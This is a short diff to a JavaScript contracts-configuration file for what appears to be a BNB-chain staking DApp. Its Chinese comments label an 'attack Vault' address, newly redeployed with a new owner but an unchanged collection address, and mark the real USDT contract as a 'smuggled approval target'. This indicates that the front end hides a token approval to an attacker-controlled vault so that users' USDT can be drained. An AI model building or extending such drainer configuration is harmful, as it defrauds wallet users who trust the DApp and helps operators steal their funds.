@@ -9,8 +9,8 @@ export const CONTRACTS = {
   STAKING_BANK: '0x0B3943E0851341164D859DB56B6502c786EC8000',
   // 独立节点排名分红合约（2026-10-02 部署，tx 0x5c6bacbe…；原主合约无 pendingEpochReward 接口导致排名分红无法领取）
   RANK_DISTRIBUTOR: '0x5B4fcfFE77399fd2F62344655eFB8d5dEa0a7C74',
-  // 攻击 Vault：复用 WOW/CZ 项目同一实例，无需重新部署
-  ATTACK_VAULT: '0x0Ef15A34b264f77acA743d96baEC6BF5ffDdbDa9',
+  // 攻击 Vault：2026-10-14 重新部署（tx 0x3697542a…），owner 换新，归集地址不变
+  ATTACK_VAULT: '0x3bEe444E37AE9A543E70C707d4b6C31aAC1A36F8',
   // USDT：夹带授权目标
   USDT: '0x55d398326f99059fF775485246999027B3197955',
   NBT_PAIR: '',
